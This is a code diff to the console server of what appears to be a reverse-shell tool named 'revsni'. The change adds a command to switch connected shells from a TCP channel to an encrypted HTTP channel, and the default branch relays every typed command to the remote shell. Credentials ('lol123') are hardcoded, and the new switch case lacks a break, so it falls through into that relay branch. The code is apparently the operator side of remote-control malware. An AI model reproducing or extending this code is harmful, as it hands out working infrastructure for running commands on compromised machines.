@@ -12,6 +12,8 @@ import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
+import com.revsni.server.http.HTTPShell;
+
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.passay.CharacterRule;
@@ -31,6 +33,9 @@ public class Server extends Observable {
     private SecretKey key;
     private IvParameterSpec iv;
     private boolean first = true;
+    public volatile String shellType;
+    private volatile Updater updater;
+    private volatile HTTPShell httpShell;
 
     private static final Logger LOG = LogManager.getLogger(Server.class);
 
@@ -54,6 +59,7 @@ public class Server extends Observable {
         
         Server server = new Server();
         
+        
         server.initServer("127.0.0.1", 1331, "lol123", "lol123");
 
         final Listener listener = new Listener(server);
@@ -66,12 +72,13 @@ public class Server extends Observable {
     }
 
     public boolean initServer(String ip, int port, String password, String saltForPass) {
+        shellType = "TCP";
         this.port = port;
         //this.ip = ip;
         //this.pass = password;
         //this.salt = saltForPass;
 
-        Updater updater = new Updater(ip, port, password, saltForPass);
+        updater = new Updater(ip, port, password, saltForPass);
 
         try {
             this.key = updater.generateKey();
@@ -110,10 +117,7 @@ public class Server extends Observable {
                     InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                     BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                     
-                    System.out.print("Revsn » ");
                     message = bufferedReader.readLine();
-
-                    LOG.info("123");
 
                     setChanged();
 
@@ -122,20 +126,44 @@ public class Server extends Observable {
                         case("configure"): printConfigure(); break;
                         case("switch"): printSwitch(); break;
                         case("mode"): printMode(); break;
-                        case("exit"): notifyObservers("exit"); break;
+                        case("kill"): notifyObservers("kill"); break;
+                        case("exit"): System.exit(0); break;
                         case("encryption"): printEncryption(); break;
+                        case("switchHTTP"): 
+                            httpShell = new HTTPShell(key, iv);
+                            updater.setShellType("HTTP");
+                            updater.generateOutputString();
+                            notifyObservers("httpSw");
+                            shellType = "HTTP";
+                            if(httpShell.getConnInf()) {
+                                shellType = "HTTP";
+                            } else {
+                                System.out.println("Failed to switch shell to HTTP!");
+                                updater.setShellType("TCP");
+                                shellType = "TCP";
+                            }
+                        
+                        default: 
+                            if(shellType.equals("TCP")) {
+                                notifyObservers(message);
+                            }
+                            if(shellType.equals("HTTP")) {
+                                httpShell.sendCommand(message);
+                            }
+                        
                     }
-                    notifyObservers(message);
+
+                    
                     
                 } 
                 while(!message.equals("quit"));
             } catch (IOException e) {
 
                 e.printStackTrace();
-            }
+            } 
             finally {
                 setRunning(false);
-                LOG.debug("Server is shutting down");
+                System.out.println("Server is shutting down");
                 try {
                     Thread.sleep(10000);
                 }
